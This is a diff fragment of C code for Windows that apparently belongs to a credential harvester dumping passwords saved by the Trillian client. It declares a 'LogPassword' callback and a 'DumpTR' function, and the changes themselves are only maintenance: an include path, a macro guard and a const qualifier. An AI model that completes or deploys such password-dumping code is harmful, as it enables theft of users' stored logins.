@@ -4,14 +4,15 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include "..\common.h"
-
 #include <windows.h>
+#include "../../H4DLL/common.h"
 
 // callback for the password
 extern int LogPassword(WCHAR *resource, WCHAR *service, WCHAR *user, WCHAR *pass);
 
+#ifndef SAFE_FREE
 #define SAFE_FREE(x) do { if (x) {free(x); x=NULL;} } while (0);
+#endif
 
 struct p_entry {
 	WCHAR service[64];
@@ -83,7 +84,7 @@ WCHAR *GetTRPath(WCHAR *FullPath, size_t size)
 }
 
 
-static int DumpTR(WCHAR *trillPath, WCHAR *signonFile)
+static int DumpTR(WCHAR *trillPath, const WCHAR *signonFile)
 {
 	WCHAR iniFile[MAX_PATH];
 	WCHAR name[64];
